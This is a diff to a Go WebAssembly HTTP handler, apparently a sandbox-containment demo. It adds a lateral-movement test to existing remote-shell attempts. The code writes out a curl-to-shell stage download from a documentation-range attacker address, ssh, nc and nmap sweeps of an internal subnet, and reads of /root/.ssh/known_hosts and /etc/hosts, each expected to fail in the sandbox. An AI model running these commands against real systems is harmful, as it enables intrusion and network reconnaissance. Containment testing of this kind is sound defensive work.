@@ -1,6 +1,6 @@
 package export_wasi_http_incoming_handler
 
-// The /run endpoint behind the four red buttons on /shell.
+// The /run endpoint behind the five red buttons on /shell.
 //
 // Almost every remote-shell technique combines three building blocks:
 //
@@ -14,6 +14,12 @@ package export_wasi_http_incoming_handler
 // code execution in this process would. Nothing is simulated: every result is
 // the error the runtime actually returned. The attacker address is in
 // 203.0.113.0/24 (TEST-NET-3, RFC 5737), which is never routed.
+//
+// The fourth technique, lateral movement (MITRE ATT&CK T1021), is what an
+// attacker does once a remote shell is up: find the neighbours and log in to
+// them. It needs the same building blocks pointed inward, at 10.0.0.0/29
+// (RFC 1918), and it meets the same absent capabilities. The sweep is a
+// handful of addresses and ports: a containment probe, not a scanner.
 
 import (
 	"encoding/json"
@@ -35,11 +41,16 @@ const (
 	attackerHost = "203.0.113.66"
 	attackerPort = "4444"
 	stageURL     = "http://" + attackerHost + "/stage.sh"
+
+	// Lateral-movement targets: the "internal network" next to the webshell.
+	internalHost   = "10.0.0.5"
+	internalSubnet = "10.0.0.0/29"
+	internalName   = "fileserver.corp.internal"
 )
 
 // step is one attempted building block.
 type step struct {
-	Block   string `json:"block"`              // network | bind | spawn
+	Block   string `json:"block"`              // network | bind | spawn | discover
 	Via     string `json:"via"`                // webshell | component
 	Action  string `json:"action"`             // what was attempted, in plain terms
 	ExecURL string `json:"exec_url,omitempty"` // the /exec request a browser could send
@@ -79,10 +90,12 @@ func handleRun(rawQuery string) []byte {
 		ts = []technique{pythonShell()}
 	case "curl":
 		ts = []technique{stageAndRun()}
+	case "pivot":
+		ts = []technique{lateralMovement()}
 	case "all":
-		ts = []technique{bashShell(), pythonShell(), stageAndRun()}
+		ts = []technique{bashShell(), pythonShell(), stageAndRun(), lateralMovement()}
 	default:
-		return marshal(map[string]string{"error": "unknown mode " + mode + " (bash | python | curl | all)"})
+		return marshal(map[string]string{"error": "unknown mode " + mode + " (bash | python | curl | pivot | all)"})
 	}
 
 	r := report{Mode: mode, AttackerHost: attackerHost, Techniques: ts}
@@ -157,9 +170,38 @@ func stageAndRun() technique {
 		Steps: []step{
 			viaWebshell("spawn", "start sh to pipe curl into a shell", "sh", "-c", payload),
 			viaWebshell("spawn", "start wget to download the stage to disk", "wget", "-qO", "/tmp/stage.sh", stageURL),
-			fetch(),
+			fetch("download "+stageURL+" through the host's outbound HTTP", attackerHost, "/stage.sh"),
 			writeFile("bind", "write the downloaded stage to /tmp/stage.sh", "/tmp/stage.sh"),
 			startProcess("spawn", "execute the freshly written /tmp/stage.sh", "/tmp/stage.sh"),
+		},
+	}
+}
+
+// lateral movement (T1021): SSH to an internal host, and a small sweep of the
+// subnet around it. Remote services (T1021.*), lateral tool transfer (T1570),
+// network service discovery (T1046) and remote system discovery (T1018) all
+// start with a connection from this process to another machine.
+func lateralMovement() technique {
+	payload := "ssh -o BatchMode=yes -o ConnectTimeout=2 deploy@" + internalHost + " id"
+	return technique{
+		ID:      "pivot",
+		Name:    "lateral movement (ssh + subnet scan)",
+		Payload: payload,
+		Steps: []step{
+			viaWebshell("spawn", "start ssh to log in to the internal host "+internalHost, "ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=2", "deploy@"+internalHost, "id"),
+			viaWebshell("spawn", "start nc to check whether "+internalHost+" answers on port 22", "nc", "-zv", "-w", "1", internalHost, "22"),
+			viaWebshell("spawn", "start nmap to scan "+internalSubnet+" for remote services", "nmap", "-sT", "-Pn", "-p", "22,445,3389", internalSubnet),
+			readFile("discover", "read ~/.ssh/known_hosts for hosts this server has logged in to", "/root/.ssh/known_hosts"),
+			readFile("discover", "read /etc/hosts for the names of internal hosts", "/etc/hosts"),
+			lookup(internalName),
+			dialTo("connect to "+internalHost+":22 over TCP (what ssh does first)", "tcp", internalHost+":22"),
+			dialTo("sweep: is there a host at 10.0.0.6? (TCP 22)", "tcp", "10.0.0.6:22"),
+			dialTo("sweep: is there a host at 10.0.0.7? (TCP 22)", "tcp", "10.0.0.7:22"),
+			dialTo("port scan: "+internalHost+":445 (SMB)", "tcp", internalHost+":445"),
+			dialTo("port scan: "+internalHost+":3389 (RDP)", "tcp", internalHost+":3389"),
+			udpProbe(internalHost + ":161"),
+			dialTo("open a raw ICMP socket to ping "+internalHost, "ip4:icmp", internalHost),
+			fetch("request http://"+internalHost+":5985/wsman (WinRM) through the host's outbound HTTP", internalHost+":5985", "/wsman"),
 		},
 	}
 }
@@ -185,11 +227,16 @@ func viaWebshell(block, action, cmd string, args ...string) step {
 // dial attempts the raw outbound TCP connection a reverse shell needs. The
 // component imports no wasi:sockets, so there is no host socket to open.
 func dial() step {
-	s := step{Block: "network", Via: "component", Action: "connect out to " + attackerHost + ":" + attackerPort + " over TCP"}
-	conn, err := net.DialTimeout("tcp", attackerHost+":"+attackerPort, 2*time.Second)
+	return dialTo("connect out to "+attackerHost+":"+attackerPort+" over TCP", "tcp", attackerHost+":"+attackerPort)
+}
+
+// dialTo attempts one connection with Go's own net.Dial and reports its error.
+func dialTo(action, network, addr string) step {
+	s := step{Block: "network", Via: "component", Action: action}
+	conn, err := net.DialTimeout(network, addr, 2*time.Second)
 	if err != nil {
 		s.Result, s.Blocked = err.Error(), true
-		s.Why = "The component imports no wasi:sockets, so Go's runtime answers from an in-memory stub. No packet leaves the sandbox."
+		s.Why = whyNoSockets
 		return s
 	}
 	conn.Close()
@@ -197,16 +244,51 @@ func dial() step {
 	return s
 }
 
-// fetch attempts the stage-1 download through the host's outgoing HTTP
-// interface: the one network path a component can ask for. The workload grants
+// udpProbe sends one datagram. UDP has no handshake, so the stub hands back a
+// socket object; the send is where the missing network shows.
+func udpProbe(addr string) step {
+	s := step{Block: "network", Via: "component", Action: "send a UDP probe to " + addr + " (SNMP)"}
+	conn, err := net.DialTimeout("udp", addr, 2*time.Second)
+	if err != nil {
+		s.Result, s.Blocked = err.Error(), true
+		s.Why = whyNoSockets
+		return s
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(time.Second))
+	if _, err := conn.Write([]byte{0x30, 0x00}); err != nil {
+		s.Result, s.Blocked = err.Error(), true
+		s.Why = whyNoSockets
+		return s
+	}
+	s.Result = "sent"
+	return s
+}
+
+// lookup asks DNS for an internal name. Go's resolver needs a UDP socket to
+// reach a nameserver, and there is none.
+func lookup(name string) step {
+	s := step{Block: "discover", Via: "component", Action: "resolve " + name + " through DNS"}
+	addrs, err := net.LookupHost(name)
+	if err != nil {
+		s.Result, s.Blocked = err.Error(), true
+		s.Why = whyNoSockets
+		return s
+	}
+	s.Result = strings.Join(addrs, ", ")
+	return s
+}
+
+// fetch attempts an HTTP GET through the host's outgoing HTTP interface: the
+// one network path a component can ask for. The workload grants
 // allowedHosts: [], so the host refuses it.
-func fetch() step {
-	s := step{Block: "network", Via: "component", Action: "download " + stageURL + " through the host's outbound HTTP"}
+func fetch(action, authority, pathWithQuery string) step {
+	s := step{Block: "network", Via: "component", Action: action}
 
 	req := MakeOutgoingRequest(MakeFields())
 	req.SetScheme(Some(MakeSchemeHttp()))
-	req.SetAuthority(Some(attackerHost))
-	req.SetPathWithQuery(Some("/stage.sh"))
+	req.SetAuthority(Some(authority))
+	req.SetPathWithQuery(Some(pathWithQuery))
 
 	opts := MakeRequestOptions()
 	opts.SetConnectTimeout(Some(uint64(2 * time.Second)))
@@ -252,6 +334,18 @@ func openFile(block, action, path string) step {
 	return s
 }
 
+func readFile(block, action, path string) step {
+	s := step{Block: block, Via: "component", Action: action}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		s.Result, s.Blocked = err.Error(), true
+		s.Why = whyNoHostFiles
+		return s
+	}
+	s.Result = fmt.Sprintf("read %d bytes", len(data))
+	return s
+}
+
 func writeFile(block, action, path string) step {
 	s := step{Block: block, Via: "component", Action: action}
 	if err := os.WriteFile(path, []byte("#!/bin/sh\nid\n"), 0o755); err != nil {
@@ -277,8 +371,10 @@ func startProcess(block, action, path string) step {
 }
 
 const (
-	whyNoProcess = "There is no $PATH and no process table: WASI has no call that starts a process, so there is no shell to run."
-	whyNoFiles   = "No filesystem was granted. There is no /dev or /tmp, and no directory to resolve the path against."
+	whyNoProcess   = "There is no $PATH and no process table: WASI has no call that starts a process, so there is no shell to run."
+	whyNoFiles     = "No filesystem was granted. There is no /dev or /tmp, and no directory to resolve the path against."
+	whyNoHostFiles = "No filesystem was granted: the workload mounts no volume, so there is no /etc and no home directory to read targets from."
+	whyNoSockets   = "The component imports no wasi:sockets, so Go's runtime answers from an in-memory stub. No packet leaves the sandbox."
 )
 
 func errorCodeName(e ErrorCode) string {
